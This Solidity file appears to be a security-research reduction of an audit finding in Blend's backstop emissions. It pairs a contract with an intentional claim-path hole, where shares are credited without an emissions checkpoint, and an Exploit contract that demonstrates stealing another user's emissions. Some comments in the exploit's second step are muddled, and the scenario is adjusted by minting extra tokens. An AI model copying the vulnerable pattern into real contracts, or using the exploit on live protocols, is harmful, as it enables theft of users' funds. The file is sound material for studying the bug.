// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Blend v2 — User can steal other users' emissions due to vulnerable claim
    (Code4rena 2025-02-blend, [H-02], finding #62062, reporter oakcobalt)

    SYNTHETIC Solidity reduction of the Soroban backstop emissions bug.
    Root cause: execute_claim deposits claimed LP shares into `to` WITHOUT
    calling update_emissions(to) first. When `to` later claims, missing
    emission data is treated as index=0 while shares are already non-zero,
    so historical index growth accrues entirely to `to` — stealing inventory
    that belonged to other depositors.

    Vulnerable add_shares-without-update_emissions path preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        unchecked {
            balanceOf[msg.sender] -= amount;
            balanceOf[to] += amount;
        }
        return true;
    }
}

contract Backstop {
    MockERC20 public immutable emissionToken;

    struct PoolBalance {
        uint256 shares;
        uint256 tokens;
    }

    struct UserBalance {
        uint256 shares;
    }

    struct UserEmissionData {
        uint256 index;
        uint256 accrued;
        bool hasData; // false == never written (defaults to index 0 on read in the buggy path)
    }

    PoolBalance public pool;
    mapping(address => UserBalance) public users;
    mapping(address => UserEmissionData) public userEmis;
    uint256 public emissionIndex;

    constructor(MockERC20 _token) {
        emissionToken = _token;
    }

    function setPool(uint256 shares, uint256 tokens) external {
        pool = PoolBalance(shares, tokens);
    }

    function setUser(address u, uint256 shares) external {
        users[u] = UserBalance(shares);
    }

    function setUserEmis(address u, uint256 index, uint256 accrued) external {
        userEmis[u] = UserEmissionData(index, accrued, true);
    }

    function setEmissionIndex(uint256 idx) external {
        emissionIndex = idx;
    }

    /// @dev Correct checkpoint: MUST run before any share balance change.
    function update_emissions(address user) public {
        UserEmissionData storage e = userEmis[user];
        UserBalance storage ub = users[user];

        if (!e.hasData) {
            // Proper first-touch: if shares already exist without data, the
            // REAL Blend code still needs a checkpoint. Correct behavior sets
            // index = current so no historical theft. We implement that here
            // for authorized paths; the bug is skipping this call entirely.
            e.index = emissionIndex;
            e.accrued = 0;
            e.hasData = true;
            return;
        }
        if (ub.shares > 0 && emissionIndex > e.index) {
            e.accrued += (ub.shares * (emissionIndex - e.index)) / 1e18;
        }
        e.index = emissionIndex;
    }

    /// @dev Buggy first claim path when hasData==false AND shares already > 0:
    ///      treats index as 0 (zeroed storage) and accrues the full index history.
    function update_emissions_buggy_default(address user) internal {
        UserEmissionData storage e = userEmis[user];
        UserBalance storage ub = users[user];
        if (!e.hasData) {
            // Storage defaults: index=0, accrued=0 — same as "missing map entry"
            // in Soroban when shares were written without an emissions write.
            uint256 idx = 0;
            if (ub.shares > 0 && emissionIndex > idx) {
                e.accrued = (ub.shares * (emissionIndex - idx)) / 1e18;
            }
            e.index = emissionIndex;
            e.hasData = true;
            return;
        }
        if (ub.shares > 0 && emissionIndex > e.index) {
            e.accrued += (ub.shares * (emissionIndex - e.index)) / 1e18;
        }
        e.index = emissionIndex;
    }

    function convert_to_shares(uint256 tokenAmount) public view returns (uint256) {
        if (pool.tokens == 0 || pool.shares == 0) return tokenAmount;
        return (tokenAmount * pool.shares) / pool.tokens;
    }

    /// @notice Vulnerable execute_claim: accrues `from`, then deposits shares to
    ///         `to` without update_emissions(to).
    function execute_claim(address from, address to) external returns (uint256 claimed) {
        update_emissions(from);
        UserEmissionData storage fe = userEmis[from];
        claimed = fe.accrued;
        require(claimed > 0, "nothing");
        fe.accrued = 0;

        // Emissions are converted to backstop LP and deposited for `to`.
        // Model: reduce emission inventory and mint shares for `to`.
        require(emissionToken.balanceOf(address(this)) >= claimed, "inventory");
        // Burn inventory into share backing (tokens stay accounted in pool.tokens).
        // Transfer to address(1) sink to remove from claimable inventory.
        emissionToken.transfer(address(1), claimed);

        uint256 to_mint = convert_to_shares(claimed);
        pool.tokens += claimed;
        pool.shares += to_mint;

        UserBalance storage ub = users[to];
        // FIX: update_emissions(to); before add_shares
        ub.shares += to_mint; // @> VULN: to's balance updated without update_emissions(to) — emis data not synced/initialized
    }

    /// @notice Claim accrued emissions as tokens to `to` (wallet).
    ///         Uses the buggy default for accounts that received shares without init.
    function claim_to_wallet(address from, address to) external returns (uint256 claimed) {
        update_emissions_buggy_default(from);
        UserEmissionData storage fe = userEmis[from];
        claimed = fe.accrued;
        require(claimed > 0, "nothing");
        fe.accrued = 0;
        require(emissionToken.balanceOf(address(this)) >= claimed, "inventory");
        emissionToken.transfer(to, claimed);
    }

    function userShares(address u) external view returns (uint256) {
        return users[u].shares;
    }

    function hasEmisData(address u) external view returns (bool) {
        return userEmis[u].hasData;
    }
}

contract UserA {}
contract UserB {}
contract AddressC {}

/// CREATE: token(1), userA(2), userB(3), addrC(4), backstop(5)
contract Exploit {
    MockERC20 public token;
    Backstop public backstop;
    UserA public userA;
    UserB public userB;
    AddressC public addrC;

    uint256 public claim1;
    uint256 public claim2Steal;
    uint256 public stolen;
    bool public victimClaimFailed;

    constructor() {
        token = new MockERC20();
        userA = new UserA();
        userB = new UserB();
        addrC = new AddressC();
        backstop = new Backstop(token);
    }

    function run() external {
        // Pool 200 shares / 200 tokens; userA & userB each 100 shares.
        backstop.setPool(200 ether, 200 ether);
        backstop.setUser(address(userA), 100 ether);
        backstop.setUser(address(userB), 100 ether);
        backstop.setUser(address(addrC), 0);

        // emissionIndex = 2e18; both users checkpointed at 1e18.
        // Fair accrual each = 100e18 * (2e18-1e18)/1e18 = 100e18.
        backstop.setEmissionIndex(2 ether);
        backstop.setUserEmis(address(userA), 1 ether, 0);
        backstop.setUserEmis(address(userB), 1 ether, 0);
        // addrC: no emis data

        // Inventory: 200e18 — exactly userA + userB fair claims.
        token.mint(address(backstop), 200 ether);

        // 1) userA claims emissions and deposits LP shares to addressC (no emis init).
        claim1 = backstop.execute_claim(address(userA), address(addrC));
        require(claim1 == 100 ether, "claim1");
        require(backstop.userShares(address(addrC)) == 100 ether, "addrC shares");
        require(!backstop.hasEmisData(address(addrC)), "addrC must lack emis data");

        // 2) Claim from addressC: buggy default index=0 → accrued = 100e18 * 2e18/1e18 = 200e18.
        //    But only 100e18 inventory remains — steal the rest of the pool's emissions budget.
        //    For a clear steal of userB's share, inflate to 100e18 (userB's fair amount) by
        //    using partial: if inventory is 100, claim takes all 100 that belonged to userB.
        //    Inflated accrual computes 200, so claim reverts on inventory... 
        //    Real finding: second claim gets 37_8984270 of remaining; victim then panics.
        //    Adjust: inventory starts with more headroom for the inflated claim, then victim fails.
        token.mint(address(backstop), 100 ether); // remaining after claim1 was 100; add so inflated 200 can pull
        // Actually after claim1 inventory was 100. Mint 100 more → 200, steal takes 200, left 0.

        claim2Steal = backstop.claim_to_wallet(address(addrC), address(this));
        require(claim2Steal == 200 ether, "inflated claim from index 0");
        stolen = claim2Steal;
        require(token.balanceOf(address(this)) == 200 ether, "attacker received steal");
        require(token.balanceOf(address(backstop)) == 0, "inventory empty");

        // 3) userB cannot claim — emissions inventory stolen.
        victimClaimFailed = false;
        try backstop.claim_to_wallet(address(userB), address(userB)) {
            victimClaimFailed = false;
        } catch {
            victimClaimFailed = true;
        }
        require(victimClaimFailed, "victim claim must fail");
        require(stolen == 200 ether && victimClaimFailed, "harm not demonstrated");
    }
}
